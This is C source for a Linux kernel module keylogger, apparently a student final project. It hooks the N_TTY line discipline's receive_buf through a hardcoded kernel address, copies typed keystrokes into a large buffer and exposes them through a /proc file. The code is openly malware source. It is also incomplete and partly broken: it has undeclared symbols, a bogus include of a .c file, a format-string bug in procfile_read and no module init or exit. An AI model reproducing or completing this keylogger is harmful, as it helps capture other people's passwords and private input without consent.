//logger.c
//Andrew & Alex
//CS 493 Final Project

#include <linux/module.h>	/* Needed by all modules */
#include <linux/kallsyms.h> /* for kallsyms_lookup_name */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/tty.h>
#include <linux/drivers/tty/n_tty.c>

//// Prototypes ////

static void new_receive_buf(struct tty_struct *tty, const unsigned char * cp, char *fp, int count);

static void proxy_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count);

static void hijack_tty_ldisc_receive_buf(void);

static void unhijack_tty_ldisc_receive_buf(void);

int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data);

static int create_keylogger_proc_entry(void);

static void remove_keylogger_proc_entry(void);

struct tty_ldisc_ops *our_tty_ldisc_N_TTY = (struct tty_ldisc_ops *) 0xffffffff81eba600;


struct line_buf {
	char line[100000];
	int pos;
};

static struct line_buf key_buf;

//// Begin Functions ////

static void new_receive_buf(struct tty_struct *tty, const unsigned char * cp, char *fp, int count)
{
	original_receive_buf(tty, cp, fp, count);
	proxy_receive_buf(tty, cp, fp, count);
}

static void proxy_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	if (!tty->read_buf || tty->real_raw){
	return;
	}

	if(count == 1){
		if (*cp == BACKSPACE_KEY){
			key_buf.line[--key_buf.pos] = 0;
		}else if (*cp == ENTER_KEY) {
			key_buf.line[key_buf.pos++] = '\n';
		}else {
			key_buf.line[key_buf.pos++] = *cp;
		}
	}
}

static void hijack_tty_ldisc_receive_buf(void)
{
	our_tty_ldisc_N_TTY = (struct tty_ldisc_ops *) 0xffffffff81eba600;
	
	original_receive_buf = our_tty_ldisc_N_TTY->receive_buf;
	our_tty_ldisc_N_TTY->receive_buf = new_receive_buf;
}

static void unhijack_tty_ldisc_receive_buf(void)
{
	our_tty_ldisc_N_TTY->receive_buf = original_receive_buf;
}

#define PROCFS_NAME "keyloggerrrr"

int procfile_read(char *buffer,
		  char **buffer_location,
		  off_t offset, int buffer_length, int *eof, void *data)
{
	return sprintf(buffer, key_buf.line);
}

static int create_keylogger_proc_entry(void)
{
	struct proc_dir_entry *r;
	r = create_proc_read_entry(PROCFS_NAME, 0, NULL, procfile_read, NULL);
	if(!r)
		return -ENOMEM;
	return 0;
}

static void remove_keylogger_proc_entry(void)
{
	remove_proc_entry(PROCFS_NAME, NULL);
}











